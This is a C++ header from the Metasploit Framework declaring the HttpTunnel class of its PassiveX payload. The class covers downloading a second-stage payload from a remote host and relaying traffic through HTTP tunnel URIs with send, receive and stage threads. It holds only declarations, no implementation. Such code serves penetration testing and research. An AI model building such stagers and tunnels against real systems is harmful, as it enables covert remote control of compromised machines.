/*
 * This file is part of the Metasploit Exploit Framework
 * and is subject to the same licenses and copyrights as
 * the rest of this package.
 */
#ifndef _PASSIVEX_HTTPTUNNEL_H
#define _PASSIVEX_HTTPTUNNEL_H

#define PASSIVEX_URI_SECOND_STAGE TEXT("/stage")
#define PASSIVEX_URI_TUNNEL_IN    TEXT("/tunnel_in")
#define PASSIVEX_URI_TUNNEL_OUT   TEXT("/tunnel_out")

#define PROFILE_CHECKPOINT(x) \
	CPassiveX::Log("%s:%d:%lu: %s\n", __FILE__, __LINE__, GetTickCount(), x)
	

/*
 * This class is responsible for managing the HTTP tunnel between a target host
 * and the local machine.
 */
class HttpTunnel
{
	public:
		HttpTunnel();
		~HttpTunnel();

		// Initialization
		DWORD Start(
				IN LPSTR HttpHost,
				IN LPSTR HttpUriBase,
				IN LPSTR HttpSid,
				IN USHORT HttpPort);
		DWORD Stop();
	protected:
		// Internal Initialization
		DWORD InitializeLocalConnection();

		// Second stage loader
		VOID DownloadSecondStage();

		// Data transmission
		DWORD TransmitToRemote(
				IN PUCHAR Buffer,
				IN ULONG BufferSize);
		DWORD TransmitToLocal(
				IN PUCHAR Buffer,
				IN ULONG BufferSize);

		DWORD TransmitHttpRequest(
				IN LPTSTR Method,
				IN LPTSTR Uri,
				IN PVOID RequestPayload = NULL,
				IN ULONG RequestPayloadLength = 0,
				IN ULONG WaitResponseTimeout = 0,
				OUT LPDWORD ResponseCode = NULL,
				OUT PVOID *ResponsePayload = NULL,
				OUT LPDWORD ResponsePayloadLength = NULL);

		// Thread functions
		static ULONG SendThreadFuncSt(
				IN HttpTunnel *Tunnel);
		ULONG SendThreadFunc();
		static ULONG ReceiveThreadFuncSt(
				IN HttpTunnel *Tunnel);
		ULONG ReceiveThreadFunc();

		static ULONG SecondStageThreadFuncSt(
				IN HttpTunnel *Tunnel);

		/**************
		 * Attributes *
		 **************/

		// Remote host information
		LPSTR     HttpHost;
		LPSTR     HttpUriBase;
		LPSTR     HttpSid;
		USHORT    HttpPort;

		// Sockets
		WSADATA   WsaData;
		SOCKET    LocalTcpListener;
		SOCKET    LocalTcpClientSide;
		SOCKET    LocalTcpServerSide;

		// Internet context
		HINTERNET InternetHandle;

		// Stage attributes
		PUCHAR    SecondStage;
		DWORD     SecondStageSize;

		// Threads
		HANDLE    SendThread;
		HANDLE    ReceiveThread;
		HANDLE    SecondStageThread;
};

#endif
